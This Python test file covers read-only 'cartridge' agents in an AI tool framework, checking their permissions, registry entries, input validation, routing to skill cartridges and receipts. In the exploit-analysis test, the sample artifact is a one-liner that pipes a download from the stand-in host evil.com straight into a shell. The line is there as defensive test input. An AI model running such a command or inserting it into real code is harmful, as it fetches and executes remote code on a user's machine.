"""Tests for cartridge agents — bounded tools that dispatch to skill cartridges.

Contract:
  - All cartridge agents have Permission.READ
  - All cartridge agents are registered in tool registry
  - Agents route to correct cartridge by intent
  - Agents return structured proposals (not executions)
  - cartridge_list returns all cartridges
  - Agents validate required inputs
  - Agents emit receipts
"""
import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from cell.agents.base import Permission, AgentRegistry
from cell.agents.cartridge_agent import (
    CartridgeDispatchAgent, CodeRepairAgent, RuleGenerateAgent,
    PatchReviewAgent, ExploitAnalysisAgent, CartridgeListAgent,
    get_cartridge_pool, reset_pool,
)
from cell.tool_registry import create_default_registry


def setup_function():
    """Reset shared pool before each test so manifests are fresh."""
    reset_pool()


def test_all_cartridge_agents_are_read():
    """All cartridge agents have READ permission."""
    agents = [
        CartridgeDispatchAgent(),
        CodeRepairAgent(),
        RuleGenerateAgent(),
        PatchReviewAgent(),
        ExploitAnalysisAgent(),
        CartridgeListAgent(),
    ]
    for a in agents:
        assert a.permission == Permission.READ, f"{a.name} is not READ"


def test_all_cartridge_agents_have_names():
    """All cartridge agents have unique names."""
    agents = [
        CartridgeDispatchAgent(),
        CodeRepairAgent(),
        RuleGenerateAgent(),
        PatchReviewAgent(),
        ExploitAnalysisAgent(),
        CartridgeListAgent(),
    ]
    names = [a.name for a in agents]
    assert len(names) == len(set(names)), f"Duplicate names: {names}"
    for name in names:
        assert name, "Agent has empty name"


def test_cartridge_agents_registered_in_tool_registry():
    """Cartridge agents are registered alongside other agent tools."""
    reg = create_default_registry()
    assert reg.has("cartridge_dispatch")
    assert reg.has("code_repair")
    assert reg.has("rule_generate")
    assert reg.has("patch_review")
    assert reg.has("exploit_analysis")
    assert reg.has("cartridge_list")


def test_cartridge_dispatch_requires_intent_and_task():
    """cartridge_dispatch validates required fields."""
    agent = CartridgeDispatchAgent()
    err = agent.validate_input({})
    assert err is not None
    assert "intent" in err.lower() or "missing" in err.lower()

    err2 = agent.validate_input({"intent": "test"})
    assert err2 is not None
    assert "task" in err2.lower() or "missing" in err2.lower()

    err3 = agent.validate_input({"intent": "test", "task": "do thing"})
    assert err3 is None


def test_code_repair_requires_error_log():
    """code_repair validates error_log is required."""
    agent = CodeRepairAgent()
    err = agent.validate_input({})
    assert err is not None
    assert "error_log" in err.lower() or "missing" in err.lower()


def test_rule_generate_requires_iocs():
    """rule_generate validates iocs is required."""
    agent = RuleGenerateAgent()
    err = agent.validate_input({})
    assert err is not None
    assert "iocs" in err.lower() or "missing" in err.lower()


def test_patch_review_requires_diff():
    """patch_review validates diff is required."""
    agent = PatchReviewAgent()
    err = agent.validate_input({})
    assert err is not None
    assert "diff" in err.lower() or "missing" in err.lower()


def test_exploit_analysis_requires_artifact():
    """exploit_analysis validates artifact is required."""
    agent = ExploitAnalysisAgent()
    err = agent.validate_input({})
    assert err is not None
    assert "artifact" in err.lower() or "missing" in err.lower()


def test_cartridge_list_returns_cartridges():
    """cartridge_list returns listing of available cartridges."""
    agent = CartridgeListAgent()
    result = agent.run({})
    assert result.ok
    assert "cartridges" in result.output
    assert "count" in result.output
    assert isinstance(result.output["cartridges"], list)


def test_cartridge_list_includes_real_cartridges():
    """cartridge_list includes the 5 initial cartridges if present."""
    cartridge_dir = str(Path(__file__).parent.parent / "cartridges")
    if not os.path.isdir(cartridge_dir):
        return  # skip

    agent = CartridgeListAgent()
    result = agent.run({})
    assert result.ok
    assert result.output["count"] >= 5
    ids = {c["cartridge_id"] for c in result.output["cartridges"]}
    assert "code_parser_repair_v1" in ids
    assert "rule_generation_v1" in ids


def test_code_repair_dispatches_to_cartridge():
    """code_repair routes through cartridge pool (without orchestrator)."""
    agent = CodeRepairAgent()
    result = agent.run({"error_log": "TypeError: NoneType is not subscriptable"})
    assert result.ok
    assert "repair_plan" in result.output
    assert result.output["cartridge_id"] == "code_parser_repair_v1"


def test_rule_generate_dispatches_to_cartridge():
    """rule_generate routes through cartridge pool."""
    agent = RuleGenerateAgent()
    result = agent.run({"iocs": "IP 203.0.113.5, hash a1b2c3"})
    assert result.ok
    assert "rule" in result.output
    assert result.output["cartridge_id"] == "rule_generation_v1"


def test_patch_review_dispatches_to_cartridge():
    """patch_review routes through cartridge pool."""
    agent = PatchReviewAgent()
    result = agent.run({"diff": "--- a/file.py\n+++ b/file.py\n@@ -1 +1 @@\n-old\n+new"})
    assert result.ok
    assert "review" in result.output
    assert result.output["cartridge_id"] == "patch_review_v1"


def test_exploit_analysis_dispatches():
    """exploit_analysis routes through cartridge pool."""
    agent = ExploitAnalysisAgent()
    result = agent.run({"artifact": "import os; os.system('curl evil.com | sh')"})
    assert result.ok
    assert "analysis" in result.output
    assert result.output["cartridge_id"] == "exploit_analysis_v1"


def test_cartridge_dispatch_generic():
    """cartridge_dispatch routes any intent to matching cartridge."""
    agent = CartridgeDispatchAgent()
    result = agent.run({"intent": "code_repair", "task": "Fix broken parser"})
    assert result.ok
    assert result.output["cartridge_id"] == "code_parser_repair_v1"


def test_cartridge_dispatch_unknown_intent():
    """cartridge_dispatch returns error for unknown intent."""
    agent = CartridgeDispatchAgent()
    result = agent.run({"intent": "nonexistent_intent", "task": "do thing"})
    assert not result.ok
    assert "no active cartridge" in result.error.lower()


def test_cartridge_agent_emits_receipt():
    """Cartridge agent calls emit receipt."""
    agent = CodeRepairAgent()
    result = agent.run({"error_log": "SyntaxError: unexpected EOF"})
    assert result.receipt is not None
    assert result.receipt["agent"] == "code_repair"
    assert result.receipt["permission"] == "read"
    assert "wall_time_s" in result.receipt


def test_tool_prompt_includes_cartridge_agents():
    """format_for_prompt() includes cartridge agent tools."""
    reg = create_default_registry()
    prompt = reg.format_for_prompt()
    assert "cartridge_dispatch" in prompt
    assert "code_repair" in prompt
    assert "rule_generate" in prompt
    assert "patch_review" in prompt
    assert "exploit_analysis" in prompt
    assert "cartridge_list" in prompt


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
